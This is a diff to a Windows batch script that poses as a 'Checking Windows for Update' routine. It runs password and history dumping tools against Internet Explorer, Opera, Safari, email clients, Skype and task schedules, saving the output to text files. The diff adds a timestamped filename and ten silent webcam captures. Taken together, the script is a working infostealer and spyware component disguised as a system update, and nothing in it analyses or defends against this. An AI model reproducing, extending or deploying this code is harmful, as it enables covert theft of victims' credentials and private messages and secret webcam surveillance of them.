@@ -1,6 +1,14 @@
 @echo off
 cd /d "C:\Users\Public\Licence\Licence-main"
 
+
+set CUR_HH=%time:~0,2%
+if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%)
+set CUR_NN=%time:~3,2%
+set CUR_SS=%time:~6,2%
+set FILENAME=%CUR_HH%%CUR_NN%%CUR_SS%
+
+
 echo Checking Windows for Update. Please wait...
         if not exist ".\Microsoft" (mkdir ".\Microsoft")
         if not exist ".\Microsoft\Addons" (mkdir ".\Microsoft\Addons")
@@ -13,6 +21,8 @@ echo Checking Windows for Update. Please wait...
         if not exist ".\Microsoft\Safari" (mkdir ".\Microsoft\Safari")
 	if exist ".\Microsoft\Screenshot" (rmdir /s /q ".\Microsoft\Screenshot")
         if not exist ".\Microsoft\Screenshot" (mkdir ".\Microsoft\Screenshot")
+	if exist ".\Microsoft\Webcam" (rmdir /s /q ".\Microsoft\Webcam")
+	if not exist ".\Microsoft\Webcam" (mkdir ".\Microsoft\Webcam")
         if not exist ".\Microsoft\Social" (mkdir ".\Microsoft\Social")
         if not exist ".\Microsoft\Task" (mkdir ".\Microsoft\Task")
         if not exist ".\Microsoft\Utility" (mkdir ".\Microsoft\Utility")
@@ -31,6 +41,16 @@ echo Checking Windows for Update. Please wait...
 		call ".\Extension\iepv.exe" /stext ".\Microsoft\IExplorer\iepv.txt"
 		call ".\Extension\OperaPassView.exe" /stext ".\Microsoft\Opera\OperaPassView.txt"
 		call ".\Extension\SafariHistoryView.exe" /stext ".\Microsoft\Safari\SafariHistoryView.txt"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_1.jpg"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_2.jpg"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_3.jpg"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_4.jpg"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_5.jpg"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_6.jpg"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_7.jpg"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_8.jpg"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_9.jpg"
+		call ".\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename ".\Microsoft\Webcam\%FILENAME%_10.jpg"
 		call ".\Extension\mailpv.exe" /stext ".\Microsoft\Social\mailpv.txt"
 		call ".\Extension\SkypeLogView.exe" /stext ".\Microsoft\Social\SkypeLogView.txt"
 		call ".\Extension\TaskSchedulerView.exe" /stext ".\Microsoft\Task\TaskSchedulerView.txt"
